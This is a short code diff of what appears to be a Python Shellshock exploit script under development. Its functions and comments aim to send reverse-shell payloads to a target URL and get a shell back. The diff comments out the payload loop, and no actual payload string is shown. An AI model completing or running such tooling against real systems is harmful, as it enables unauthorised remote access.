@@ -19,7 +19,6 @@ def shellshock_http_req(lhost, lport, rhost, rport, target_url):
    # The sendall function sends the data we need. It's needed to encode the variables before inserting otherwise they're treated like a string
    rhost_encoded = rhost.encode()
    lhost_encoded = lhost.encode()
-   lport_bytes = str(lport).encode()
    #lport_encoded = lport.encode()
    #s.sendall(b"GET / HTTP1.1\r\nHost: 192.168.0.100\r\n\r\n")
    #s.sendall(b"GET / HTTP 1.1\r\nHost: %s\r\n\r\n" % rhost)
@@ -62,8 +61,8 @@ def main():
 
 
     #Just a GET request ATM. Needs to have a socket attached
-    result = shellshock_rev_payloads(lhost, lport, target_url)
-    for rev_payload in result:
+    #result = shellshock_rev_payloads(lhost, lport, target_url)
+    #for rev_payload in result:
         ''' 
         The payloads should cycle from 1 - ... here until one payload connects back to us 
         Create sockets back to us which contain the payloads
@@ -73,7 +72,7 @@ def main():
         Get all the rev shells to send in a get request
         '''
 
-        print("Reverse shell payload(s): {}".format(rev_payload))
+    #    print("Reverse shell payload(s): {}".format(rev_payload))
         '''
         rev_sock.connect(lhost, lport) - This will create a socket and then send the payload to target and then we get shell (Reverse shell payload)
     '''
